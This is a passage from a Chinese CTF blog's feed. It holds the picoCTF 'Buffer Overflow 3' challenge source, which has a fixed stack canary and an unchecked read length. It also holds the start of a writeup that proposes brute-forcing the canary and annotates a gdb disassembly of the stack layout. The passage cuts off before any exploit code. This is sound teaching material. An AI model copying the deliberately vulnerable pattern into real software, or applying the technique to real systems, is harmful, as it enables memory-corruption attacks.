+&lt;li&gt;函数编写的不够谨慎，使得 &lt;code&gt;printf&lt;/code&gt; 能够泄露出 Security Cookie 的值&lt;/li&gt;
+&lt;li&gt;如果能够重复地溢出同一个进程（例如函数调用了 &lt;code&gt;fork&lt;/code&gt;，使得原来的进程不会崩溃退出），则可以尝试暴力破解&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="binary" /><summary type="html">当栈溢出发生时，如果能够检测到栈溢出已经发生，就可以及时中止程序的执行，从而能够避免继续走攻击者安排好的路。Windows 上的 Security Cookie 就是这样一种机制。在 Linux 上，Canary 这个名字更常用。不论是 Security Cookie 还是 Canary，它们的原理都是相同的。</summary></entry><entry><title type="html">Buffer Overflow 3</title><link href="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-3.html" rel="alternate" type="text/html" title="Buffer Overflow 3" /><published>2019-02-27T00:00:00+00:00</published><updated>2019-02-27T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-3</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-3.html">&lt;p&gt;这道题模拟了栈溢出保护，但 canary 是固定的：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;wchar.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-7&quot; title=&quot;7&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;locale.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-8&quot; title=&quot;8&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-9&quot; title=&quot;9&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define BUFSIZE 32&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-10&quot; title=&quot;10&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define FLAGSIZE 64&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-11&quot; title=&quot;11&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define CANARY_SIZE 4&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-12&quot; title=&quot;12&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-13&quot; title=&quot;13&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; win() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-14&quot; title=&quot;14&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[FLAGSIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-15&quot; title=&quot;15&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;FILE&lt;/span&gt; *f = fopen(&lt;span class=&quot;st&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-16&quot; title=&quot;16&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (f == NULL) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-17&quot; title=&quot;17&quot;&gt;    printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-18&quot; title=&quot;18&quot;&gt;    exit(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-19&quot; title=&quot;19&quot;&gt;  }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-20&quot; title=&quot;20&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-21&quot; title=&quot;21&quot;&gt;  fgets(buf,FLAGSIZE,f);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-22&quot; title=&quot;22&quot;&gt;  puts(buf);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-23&quot; title=&quot;23&quot;&gt;  fflush(stdout);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-24&quot; title=&quot;24&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-25&quot; title=&quot;25&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-26&quot; title=&quot;26&quot;&gt;&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; global_canary[CANARY_SIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-27&quot; title=&quot;27&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; read_canary() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-28&quot; title=&quot;28&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;FILE&lt;/span&gt; *f = fopen(&lt;span class=&quot;st&quot;&gt;&amp;quot;canary.txt&amp;quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-29&quot; title=&quot;29&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (f == NULL) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-30&quot; title=&quot;30&quot;&gt;    printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-31&quot; title=&quot;31&quot;&gt;    exit(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-32&quot; title=&quot;32&quot;&gt;  }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-33&quot; title=&quot;33&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-34&quot; title=&quot;34&quot;&gt;  fread(global_canary,&lt;span class=&quot;kw&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;),CANARY_SIZE,f);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-35&quot; title=&quot;35&quot;&gt;  fclose(f);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-36&quot; title=&quot;36&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-37&quot; title=&quot;37&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-38&quot; title=&quot;38&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vuln(){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-39&quot; title=&quot;39&quot;&gt;   &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; canary[CANARY_SIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-40&quot; title=&quot;40&quot;&gt;   &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[BUFSIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-41&quot; title=&quot;41&quot;&gt;   &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; length[BUFSIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-42&quot; title=&quot;42&quot;&gt;   &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; count;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-43&quot; title=&quot;43&quot;&gt;   &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; x = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-44&quot; title=&quot;44&quot;&gt;   memcpy(canary,global_canary,CANARY_SIZE);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-45&quot; title=&quot;45&quot;&gt;   printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;How Many Bytes will You Write Into the Buffer?&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;gt; &amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-46&quot; title=&quot;46&quot;&gt;   &lt;span class=&quot;cf&quot;&gt;while&lt;/span&gt; (x&amp;lt;BUFSIZE) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-47&quot; title=&quot;47&quot;&gt;      read(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;,length+x,&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-48&quot; title=&quot;48&quot;&gt;      &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (length[x]==&lt;span class=&quot;ch&quot;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;) &lt;span class=&quot;cf&quot;&gt;break&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-49&quot; title=&quot;49&quot;&gt;      x++;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-50&quot; title=&quot;50&quot;&gt;   }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-51&quot; title=&quot;51&quot;&gt;   sscanf(length,&lt;span class=&quot;st&quot;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;count);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-52&quot; title=&quot;52&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-53&quot; title=&quot;53&quot;&gt;   printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Input&amp;gt; &amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-54&quot; title=&quot;54&quot;&gt;   read(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;,buf,count);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-55&quot; title=&quot;55&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-56&quot; title=&quot;56&quot;&gt;   &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (memcmp(canary,global_canary,CANARY_SIZE)) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-57&quot; title=&quot;57&quot;&gt;      printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;*** Stack Smashing Detected *** : Canary Value Corrupt!&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-58&quot; title=&quot;58&quot;&gt;      exit(-&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-59&quot; title=&quot;59&quot;&gt;   }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-60&quot; title=&quot;60&quot;&gt;   printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Ok... Now Where&amp;#39;s the Flag?&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-61&quot; title=&quot;61&quot;&gt;   fflush(stdout);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-62&quot; title=&quot;62&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-63&quot; title=&quot;63&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-64&quot; title=&quot;64&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; **argv){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-65&quot; title=&quot;65&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-66&quot; title=&quot;66&quot;&gt;  setvbuf(stdout, NULL, _IONBF, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-67&quot; title=&quot;67&quot;&gt;  &lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-68&quot; title=&quot;68&quot;&gt;  &lt;span class=&quot;co&quot;&gt;// Set the gid to the effective gid&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-69&quot; title=&quot;69&quot;&gt;  &lt;span class=&quot;co&quot;&gt;// this prevents /bin/sh from dropping the privileges&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-70&quot; title=&quot;70&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; i;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-71&quot; title=&quot;71&quot;&gt;  gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-72&quot; title=&quot;72&quot;&gt;  setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-73&quot; title=&quot;73&quot;&gt;  read_canary();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-74&quot; title=&quot;74&quot;&gt;  vuln();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-75&quot; title=&quot;75&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-76&quot; title=&quot;76&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;由于 Canary 是固定的，因此可以通过多次运行猜测出 Canary 的值。首先我们看一下各个局部变量的位置：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode asm&quot;&gt;&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-1&quot; title=&quot;1&quot;&gt;(gdb) disas vuln&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-2&quot; title=&quot;2&quot;&gt;Dump of assembler code for function vuln:&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487c3 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;&amp;gt;:     &lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt;   %&lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487c4 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;&amp;gt;:     &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt;    %&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;,%&lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487c6 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;3&lt;/span&gt;&amp;gt;:     &lt;span class=&quot;bu&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;dv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x58,&lt;/span&gt;%&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487c9 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;6&lt;/span&gt;&amp;gt;:     movl   &lt;span class=&quot;dv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x0,&lt;/span&gt;-&lt;span class=&quot;bn&quot;&gt;0xc&lt;/span&gt;(%&lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-7&quot; title=&quot;7&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487d0 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;13&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;    0x804a058,&lt;/span&gt;%&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-8&quot; title=&quot;8&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487d5 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;18&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt;    %&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;,-&lt;span class=&quot;bn&quot;&gt;0x10&lt;/span&gt;(%&lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;) &lt;span class=&quot;co&quot;&gt;; canary = $ebp - 0x10&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-9&quot; title=&quot;9&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487d8 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;21&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;dv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0xc&lt;/span&gt;,%&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-10&quot; title=&quot;10&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487db &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;24&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;dv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x8048a90&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-11&quot; title=&quot;11&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487e0 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;29&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;   0x8048500 &lt;/span&gt;&amp;lt;printf@plt&amp;gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-12&quot; title=&quot;12&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487e5 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;34&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;dv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x10,&lt;/span&gt;%&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-13&quot; title=&quot;13&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487e8 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;37&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;jmp&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;    0x8048815 &lt;/span&gt;&amp;lt;vuln+&lt;span class=&quot;dv&quot;&gt;82&lt;/span&gt;&amp;gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-14&quot; title=&quot;14&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487ea &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;39&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;bn&quot;&gt;-0xc&lt;/span&gt;(%&lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;),%&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;  &lt;span class=&quot;co&quot;&gt;; x = $ebp-0xc&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-15&quot; title=&quot;15&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080487ed &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;42&lt;/span&gt;&amp;gt;:    &lt;span class=&quot;bu&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;bn&quot;&gt;-0x50&lt;/span&gt;(%&lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;),%&lt;span class=&quot;kw&quot;&gt;edx&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; length = $ebp - 0x50&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-16&quot; title=&quot;16&quot;&gt;                        ...&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-17&quot; title=&quot;17&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x0804884c &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;137&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt;   %&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-18&quot; title=&quot;18&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x0804884d &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;138&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;bn&quot;&gt;-0x30&lt;/span&gt;(%&lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;),%&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; buf = $ebp - 0x30&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-19&quot; title=&quot;19&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x08048850 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;141&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt;   %&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-20&quot; title=&quot;20&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x08048851 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;142&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;dv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x0&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-21&quot; title=&quot;21&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x08048853 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;144&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;   0x80484f0 &lt;/span&gt;&amp;lt;read@plt&amp;gt;&lt;/a&gt;
